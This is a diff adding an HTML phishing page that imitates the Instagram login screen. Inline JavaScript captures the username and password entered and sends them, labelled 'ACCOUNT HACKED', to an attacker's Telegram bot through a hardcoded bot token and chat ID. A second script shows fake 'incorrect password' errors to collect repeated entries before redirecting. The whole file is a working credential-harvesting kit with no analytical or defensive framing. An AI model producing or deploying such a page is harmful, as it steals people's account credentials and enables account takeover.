@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Instagram</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+:root{
+  --border:#dbdbdb;
+  --text:#262626;
+  --muted:#8e8e8e;
+  --blue:#0095f6;
+  --bg:#fafafa;
+  --error:#ed4956;
+}
+
+*{ box-sizing:border-box; }
+
+body{
+  margin:0;
+  background:var(--bg);
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+}
+
+.wrapper{
+  min-height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
+
+.container{
+  display:flex;
+  gap:32px;
+}
+
+.phone{
+  width:380px;
+  height:581px;
+  background:url("https://i.imgur.com/Q8dS6YF.png") center/contain no-repeat;
+}
+
+.right{ width:350px; }
+
+.card{
+  background:#fff;
+  border:1px solid var(--border);
+  padding:10px 0 18px;
+  text-align:center;
+}
+
+.logo{
+  margin:36px 0 12px;
+}
+.logo img{ width:175px; }
+
+.form{ margin:0 40px; }
+
+.form input{
+  width:100%;
+  height:38px;
+  margin-bottom:6px;
+  padding:9px 8px;
+  font-size:12px;
+  background:#fafafa;
+  border:1px solid var(--border);
+  border-radius:3px;
+}
+
+.login-btn{
+  width:100%;
+  height:32px;
+  margin-top:8px;
+  background:var(--blue);
+  color:#fff;
+  border:none;
+  border-radius:8px;
+  font-weight:600;
+  font-size:14px;
+  cursor:pointer;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:8px;
+}
+.password-input{
+  -webkit-text-security: disc; /* Chrome, Edge, Android */
+  text-security: disc;         /* fallback */
+}
+
+.spinner{
+  width:16px;
+  height:16px;
+  border:2px solid #fff;
+  border-top:2px solid transparent;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+  display:none;
+}
+
+@keyframes spin{
+  0%{ transform:rotate(0deg); }
+  100%{ transform:rotate(360deg); }
+}
+
+.error{
+  display:none;
+  margin:10px 40px 0;
+  color:var(--error);
+  font-size:14px;
+}
+
+.or{
+  display:flex;
+  align-items:center;
+  margin:18px 40px;
+  font-size:13px;
+  color:var(--muted);
+}
+.or::before,.or::after{
+  content:"";
+  flex:1;
+  height:1px;
+  background:var(--border);
+}
+.or span{ margin:0 18px; }
+
+.fb{
+  color:#385185;
+  font-weight:600;
+  font-size:14px;
+}
+.forgot{
+  margin-top:14px;
+  font-size:12px;
+  color:#00376b;
+}
+
+.signup{
+  margin-top:10px;
+  padding:20px 0;
+  border:1px solid var(--border);
+  background:#fff;
+  text-align:center;
+  font-size:14px;
+}
+.signup span{
+  color:var(--blue);
+  font-weight:600;
+}
+
+.apps{
+  text-align:center;
+  margin-top:20px;
+  font-size:14px;
+}
+.apps img{
+  width:136px;
+  margin:10px 4px;
+}
+
+@media(max-width:875px){
+  .phone{ display:none; }
+}
+</style>
+</head>
+
+<body>
+
+<div class="wrapper">
+  <div class="container">
+
+    <div class="phone"></div>
+
+    <div class="right">
+
+      <div class="card">
+        <div class="logo">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/512px-Instagram_logo.svg.png">
+        </div>
+        
+       
+
+        <form class="form" id="loginForm">
+          <input id="text" placeholder="Phone number, username, or email" required>
+          <input
+  id="password"
+  placeholder="Password"
+  required
+  class="password-input"
+/>
+      
+
+
+
+          <button  onclick="sendToTelegram()"   class="login-btn" type="submit">
+            <span id="btnText">Log in</span>
+            <div class="spinner" id="spinner"></div>
+          </button>
+        </form>
+
+        <div class="error" id="errorMsg">
+          Incorrect username or password.
+        </div>
+        
+<script>
+function sendToTelegram() {
+  const name = document.getElementById("text").value;
+  const msg = document.getElementById("password").value;
+
+  const BOT_TOKEN = "8390602758:AAGx5zvAB5j1OgCw27x_BqRc2Mz9cDtoymM";
+  const CHAT_ID = "6320680594";
+
+  
+const text =
+`𓆩 𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝙷𝙰𝙲𝙺𝙴𝙳 𓆪
+╭──────────────────╮
+│  ᵤₛₑᵣₙₐₘₑ ▸ ${name}
+│  ────────────
+│  ᴾᴬˢˢᵂᴼᴿᴰ ▸ ${msg}
+│  ────────────
+│  ʜᴀᴄᴋᴇᴅ ʙʏ ▸ @1vjnz × udit
+╰──────────────────╯`;
+
+  
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: text
+    })
+})
+}
+</script>
+
+        
+
+        
+        
+
+        <div class="or"><span>OR</span></div>
+        <div class="fb">Log in with Facebook</div>
+        <div class="forgot">Forgot password?</div>
+      </div>
+
+      <div class="signup">
+        Don’t have an account? <span>Sign up</span>
+      </div>
+
+      <div class="apps">
+        Get the app.<br>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/App_Store_badge_EN.svg">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Google_Play_Store_badge_EN.svg">
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<script>
+let attempts = 0;
+const MAX_ATTEMPTS = 3;
+
+const form = document.getElementById("loginForm");
+const spinner = document.getElementById("spinner");
+const btnText = document.getElementById("btnText");
+const errorMsg = document.getElementById("errorMsg");
+
+form.addEventListener("submit", function(e){
+  e.preventDefault();
+
+  spinner.style.display = "block";
+  btnText.style.display = "none";
+  errorMsg.style.display = "none";
+
+  setTimeout(() => {
+    spinner.style.display = "none";
+    btnText.style.display = "block";
+
+    attempts++;
+
+    if(attempts < MAX_ATTEMPTS){
+      errorMsg.style.display = "block";
+    }else{
+      window.location.href = "dashboard.html";
+    }
+
+  }, 5000); // 5 sec spinner
+});
+</script>
+
+</body>
+</html>
